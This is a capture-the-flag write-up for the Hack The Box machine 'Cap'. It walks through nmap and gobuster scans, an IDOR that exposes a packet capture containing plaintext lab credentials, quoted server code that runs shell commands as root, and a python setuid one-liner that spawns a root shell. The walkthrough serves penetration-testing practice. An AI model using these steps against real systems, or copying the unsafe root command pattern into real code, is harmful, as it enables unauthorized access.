# Cap

- Target Machine: 10.10.10.245

## Enumeration

### nmap scan

```bash
# Nmap 7.92 scan initiated Tue Sep  7 16:20:43 2021 as: nmap -sC -sV -oN nmap/initial.log 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (0.050s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Tue, 07 Sep 2021 14:35:08 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|
```

### Gobuster scan

```bash
/data                 (Status: 302) [Size: 208] [--> http://10.10.10.245/]
/ip                   (Status: 200) [Size: 17373]
/netstat              (Status: 200) [Size: 92406]
```

### Accessing the machine

In the nmap scan we can see that the target machine is running HTTP, SSH and FTP. By checking the machine website, we get logged in as the user Nathan on an admin dashboard containing some links to the sub-directories `/netstat`, containing some data regarding PCAP captures, and `/capture`, a page that runs a PCAP scan for 5 seconds and then gives out the result, redirecting to the page `/data/{NUMBER}`.

If we try to change the number given as a URL parameter to 0, we could access the data of the first scan runned, download it and open it in Wireshark. Once we open the file, we can scroll through it to find the login credentials `nathan : Buck3tH4TF0RM3!`. We can now SSH into the machine as nathan and get the user flag.

## Priviledge escalation

If we look into the `/var/www/html` folder, we can look through the source code of `app.py`, finding a peculiar comment:

```py
path = os.path.join(app.root_path, "upload", str(pcapid) + ".pcap")
ip = request.remote_addr
# permissions issues with gunicorn and threads. hacky solution for now.
#os.setuid(0)
#command = f"timeout 5 tcpdump -w {path} -i any host {ip}"
command = f"""python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'"""
os.system(command)
#os.setuid(1000)
```

As we can see, the program temporarly changes the uid permissions using the method `os.setuid(0)`, giving the program root priviledges. By running `ls -la`, we can see that nathan is the owner of this file, meaning he has enough permissions to run this python script and the setuid method.

We can exploit this by running our own python script using setuid and spawning a shell as root:

```bash
-bash-5.0$ python3.8 -c "import os; os.setuid(0); os.system('bash')"

bash-5.0# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)

bash-5.0# 
```

The root flag is in the root folder.
